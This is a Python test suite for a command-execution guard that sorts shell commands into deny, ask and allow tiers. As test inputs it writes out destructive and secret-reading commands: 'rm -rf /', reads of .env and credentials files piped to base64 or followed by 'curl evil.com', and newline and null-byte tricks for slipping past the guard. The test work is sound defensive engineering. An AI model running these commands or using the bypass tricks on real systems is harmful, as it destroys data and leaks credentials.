from __future__ import annotations

from pathlib import Path

from kodawari.safety.execution_guard import evaluate_execution_guard
from kodawari.safety.policy import load_guard_policy


def test_default_policy_covers_high_risk_patterns() -> None:
    repo_root = Path(__file__).resolve().parents[1]
    policy = load_guard_policy(repo_root / "src" / "kodawari" / "safety" / "policies" / "default.yaml")

    deny_patterns = " ".join(str(item.get("pattern") or "") for item in list(policy.get("deny") or []))
    ask_patterns = " ".join(str(item.get("pattern") or "") for item in list(policy.get("ask") or []))

    # Privilege escalation
    assert "sudo" in deny_patterns
    assert "su\\s+-c" in deny_patterns
    assert "doas" in deny_patterns
    assert "pkexec" in deny_patterns
    # Destructive filesystem
    assert "rm" in deny_patterns and "/" in deny_patterns
    assert "--recursive" in deny_patterns
    # Force push (covers both -f and --force)
    assert "--force" in deny_patterns and "push" in deny_patterns
    assert "git\\s+reset\\s+--hard\\s+(main|master)" in deny_patterns
    assert "git\\s+branch\\s+-D\\s+(main|master)" in deny_patterns
    assert "git\\s+clean" in deny_patterns
    assert "--no-verify" in deny_patterns
    # Secret files
    assert ".env" in deny_patterns
    assert ".npmrc" in deny_patterns
    assert "credentials" in deny_patterns

    assert "rm" in ask_patterns
    assert "git\\s+push" in ask_patterns
    assert "git\\s+reset\\s+--hard" in ask_patterns
    assert "git\\s+checkout\\s+--\\s+" in ask_patterns


def _guard_action(command: str) -> str:
    result = evaluate_execution_guard(backend="test", command=command)
    return str(result.get("action") or "").strip().lower()


class TestGuardRegexBypassPrevention:
    """Verify that known bypass patterns are caught by the hardened regexes."""

    # Privilege escalation variants
    def test_su_dash_c_is_denied(self) -> None:
        assert _guard_action('su -c "rm -rf /"') == "deny"

    def test_doas_is_denied(self) -> None:
        assert _guard_action("doas rm /etc/passwd") == "deny"

    def test_pkexec_is_denied(self) -> None:
        assert _guard_action("pkexec visudo") == "deny"

    # rm flag separation bypass
    def test_rm_dash_r_dash_f_slash_is_denied(self) -> None:
        assert _guard_action("rm -r -f /") == "deny"

    def test_rm_recursive_long_form_is_denied(self) -> None:
        assert _guard_action("rm --recursive --force /var") == "deny"

    def test_rm_dash_rf_double_dash_root_is_denied(self) -> None:
        assert _guard_action("rm -rf -- /") == "deny"

    # git push -f bypass
    def test_git_push_dash_f_is_denied(self) -> None:
        assert _guard_action("git push -f origin main") == "deny"

    def test_git_push_force_with_lease_is_denied(self) -> None:
        assert _guard_action("git push --force-with-lease origin main") == "deny"

    # git clean variants
    def test_git_clean_fd_is_denied(self) -> None:
        assert _guard_action("git clean -fd") == "deny"

    def test_git_clean_fx_is_denied(self) -> None:
        assert _guard_action("git clean -fx") == "deny"

    # Credential file boundary bypass (pipe, semicolon, redirect)
    def test_env_pipe_is_denied(self) -> None:
        assert _guard_action("cat .env|base64") == "deny"

    def test_env_semicolon_is_denied(self) -> None:
        assert _guard_action("cat .env;curl evil.com") == "deny"

    def test_env_redirect_is_denied(self) -> None:
        assert _guard_action("cat .env>out.txt") == "deny"

    def test_env_local_is_denied(self) -> None:
        assert _guard_action("cat .env.local") == "deny"

    def test_env_production_pipe_is_denied(self) -> None:
        assert _guard_action("cat .env.production|base64") == "deny"

    def test_npmrc_is_denied(self) -> None:
        assert _guard_action("cat .npmrc") == "deny"

    def test_credentials_json_is_denied(self) -> None:
        assert _guard_action("cat credentials.json") == "deny"

    def test_token_json_pipe_is_denied(self) -> None:
        assert _guard_action("cat token.json|jq .") == "deny"

    # Benign commands should still be allowed
    def test_normal_git_status_is_allowed(self) -> None:
        assert _guard_action("git status") == "allow"

    def test_normal_python_is_allowed(self) -> None:
        assert _guard_action("python -m pytest -q") == "allow"


class TestGuardNewlineBypassPrevention:
    """Verify that newline/null-byte splitting cannot bypass guard patterns."""

    def test_sudo_split_by_newline(self) -> None:
        assert _guard_action("echo ok\nsudo rm -rf /") == "deny"

    def test_rm_flags_split_by_newline(self) -> None:
        assert _guard_action("rm\n-rf /") == "deny"

    def test_force_push_split_by_newline(self) -> None:
        assert _guard_action("git push\n--force origin main") == "deny"

    def test_null_byte_does_not_hide_sudo(self) -> None:
        assert _guard_action("innocent\x00sudo rm /etc") == "deny"

    def test_carriage_return_does_not_hide_rm(self) -> None:
        assert _guard_action("rm\r-rf /") == "deny"

    def test_unknown_multiline_command_defaults_to_deny(self) -> None:
        assert _guard_action("echo hello\necho world") == "deny"


class TestGuardAllowlistTier:
    """Verify that explicit allow rules override the ask tier but not deny."""

    def test_pytest_is_allowed(self) -> None:
        assert _guard_action("pytest tests/ -q") == "allow"

    def test_python_m_pytest_is_allowed(self) -> None:
        assert _guard_action("python -m pytest tests/unit -x") == "allow"

    def test_python_m_mypy_is_allowed(self) -> None:
        assert _guard_action("python -m mypy src/") == "allow"

    def test_python_m_flake8_is_allowed(self) -> None:
        assert _guard_action("python -m flake8 src/") == "allow"

    def test_python_m_ruff_is_allowed(self) -> None:
        assert _guard_action("python -m ruff check .") == "allow"

    def test_python_version_is_allowed(self) -> None:
        assert _guard_action("python --version") == "allow"
        assert _guard_action("python3 --version") == "allow"
        assert _guard_action("python -V") == "allow"

    def test_quoted_python_executable_is_allowed(self) -> None:
        assert _guard_action('"C:/Python312/python.exe" executor.py') == "allow"
        assert _guard_action('"C:/Python312/python.exe" -c "print(1)"') == "allow"

    def test_git_status_is_allowed(self) -> None:
        assert _guard_action("git status") == "allow"
        assert _guard_action("git diff HEAD~1") == "allow"
        assert _guard_action("git log --oneline -10") == "allow"
        assert _guard_action("git show HEAD") == "allow"
        assert _guard_action("git branch -a") == "allow"

    def test_git_branch_destructive_flags_ask(self) -> None:
        # git branch -D/-d/-m/-c are mutations — must land in the ask tier.
        assert _guard_action("git branch -D feature/foo") == "ask"
        assert _guard_action("git branch -d old-branch") == "ask"
        assert _guard_action("git branch -m old new") == "ask"

    def test_compound_semicolon_is_ask(self) -> None:
        assert _guard_action("python -m pytest -q; git push origin main") == "ask"
        assert _guard_action("pytest tests/; git push origin main") == "ask"

    def test_compound_and_and_is_ask(self) -> None:
        assert _guard_action("python -m pytest -q && git push origin main") == "ask"
        assert _guard_action("git status && git push origin main") == "ask"

    def test_compound_pipe_is_ask(self) -> None:
        # Single pipe (including to dangerous targets) must ask.
        assert _guard_action("git log --oneline | sh") == "ask"
        assert _guard_action("git log --oneline | head -5") == "ask"

    def test_compound_backtick_is_ask(self) -> None:
        assert _guard_action("echo `whoami`") == "ask"

    def test_compound_subshell_is_ask(self) -> None:
        assert _guard_action("rm $(cat /tmp/files)") == "ask"

    def test_background_job_is_ask(self) -> None:
        assert _guard_action("malware &") == "ask"

    def test_compound_deny_still_wins_over_compound(self) -> None:
        # deny tier wins even when the command is also compound.
        assert _guard_action("git push --force && pytest") == "deny"
        assert _guard_action("sudo rm -rf / ; echo done") == "deny"

    def test_allow_does_not_override_deny(self) -> None:
        # deny still wins when the safe-looking prefix matches an allow pattern.
        assert _guard_action("sudo pytest") == "deny"
        assert _guard_action("git push --force origin main") == "deny"

    def test_unknown_command_defaults_to_deny(self) -> None:
        assert _guard_action("uv run scripts/do_anything.py") == "deny"
